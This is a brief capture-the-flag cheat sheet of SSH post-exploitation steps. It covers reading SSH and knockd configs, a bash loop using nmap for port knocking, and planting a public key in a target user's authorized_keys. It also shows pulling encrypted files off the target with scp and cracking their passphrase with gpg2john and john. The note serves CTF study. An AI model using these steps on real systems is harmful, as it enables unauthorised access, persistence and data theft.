# SSH for CTF 

- when you get a shell, check /etc/ for ssh config files (also in /home/user/.ssh, /etc/knockd.conf) 

- if you find knockd.conf > port knocking bash script  
```
for x in <ports-from-knockd>; do nmap -Pn --max-retries 0 -p $x <IP>; done 
```
- if ssh won't allow password login (only publickey, keyex, etcâ€¦), you need to find creds then generate a keypair via   #: ssh-keygen -b 2048 , then find a way to put these keys into that users ~/.ssh directory (via ftp shell or otherwise, #put /root/.ssh/id_rsa.pub  ~/.ssh/authorized_keys) 

- did you find `.pgp` and `.asc` files? 
	you can transfer them to your own box via SCP (`#: scp user@IP:/path/to/files/*  /your/folder/to/store/them`  ).  
	Then you can decrypt them via `gpg2john file.asc` > hash 
	Then `john --wordlist=rockyou.txt hash`
	 now you can `gpg --import  file.asc`  and `gpg --decrypt file.pgp`
